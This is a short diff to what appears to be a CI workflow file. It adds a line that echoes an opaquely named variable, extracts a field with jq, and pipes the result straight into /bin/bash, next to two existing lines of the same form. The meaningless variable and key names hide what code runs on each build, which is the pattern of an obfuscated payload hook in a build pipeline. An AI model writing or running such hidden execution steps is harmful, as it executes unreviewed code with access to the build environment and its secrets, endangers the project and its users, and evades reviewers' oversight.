@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$gz37" | jq -r .nqwem30515 | /bin/bash
           echo $edw541 | jq -r .vupiy10 | /bin/bash
+          echo $g4 | jq -r .wf913 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
